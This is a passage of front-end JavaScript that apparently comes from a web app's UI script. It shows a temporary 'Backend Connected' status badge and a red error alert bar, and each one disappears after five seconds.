    const statusDiv = document.createElement('div');
    statusDiv.className = 'backend-status';
    statusDiv.innerHTML = '<i class="fas fa-server"></i> Backend Connected';
    document.body.appendChild(statusDiv);
    
    setTimeout(() => {
        statusDiv.style.opacity = '0';
        setTimeout(() => {
            if (statusDiv.parentNode) {
                statusDiv.remove();
            }
        }, 1000);
    }, 5000);
}

// Error alert function
function showErrorAlert(message) {
    const alertDiv = document.createElement('div');
    alertDiv.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        background: #dc3545;
        color: white;
        padding: 15px;
        text-align: center;
        z-index: 10001;
        font-weight: 500;
    `;
    alertDiv.textContent = message;
    document.body.appendChild(alertDiv);
    
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}